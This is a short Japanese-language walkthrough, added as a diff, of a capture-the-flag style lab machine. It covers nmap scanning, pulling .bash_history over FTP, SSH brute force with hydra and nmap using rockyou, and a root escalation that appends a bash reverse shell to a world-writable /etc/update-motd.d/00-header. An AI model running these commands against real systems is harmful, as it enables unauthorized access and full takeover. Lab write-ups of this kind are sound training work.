@@ -1,0 +1,33 @@
+## 攻略
+- nmap
+  - 21,22,80
+- webサイトを見る
+  - 何か登録できそうなサイト。こういうの見たら、何を疑う？
+  - ソースコードを見たら、usernameにsysadminがあるのがわかる 
+- 21番ポートからチェックする
+  - nmapでヒントが出ていたので、それを利用する
+  - `ftp $IP`
+  - `ls -a`  ftpでオプションが使えるの初めて知った
+  - `get .bash_history`
+  - ftpから抜ける
+  - ファイル名がややこしいので名前を替える。`mv .bash_history bash_history`
+- hydraでbrute force
+  -  `hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://$IP`
+  -  password1が出てくる
+- (補足)nmapでbrute force
+  - hydraでもできるが、ここではnmapでもできる
+  - `sudo nmap --script=ssh-brute.nse -p22 $IP`
+  - sysadmin:password1
+- sshで侵入
+- システム内探索
+  - `id`コマンドするとsudoグループにいるが、使えない 
+- さっきの.bash_historyを見てみる
+  - `cat .bash_history`
+  - /etc/update-motd.d/00-headerを見ると、sshでアクセスした時に、このファイルが呼ばれていたのがわかる
+  - この/etc/update-motd.dを調べる。すると、このファイルはログイン時に呼び出されることがわかる
+  - このpermissionを見るとわかるが、権限がrootで誰でも読み書きできることがわかる
+- rootになる
+  - `00-header`の一番下にreverse-shellを書き込む
+  - `echo "bash -c 'exec bash -i &>/dev/tcp/192.168.56.101/9001 <&1'" >> /etc/update-motd.d/00-header`
+  - parrot側で待ち受ける
+  - 再度sshで接続したらrootになれるのがわかる
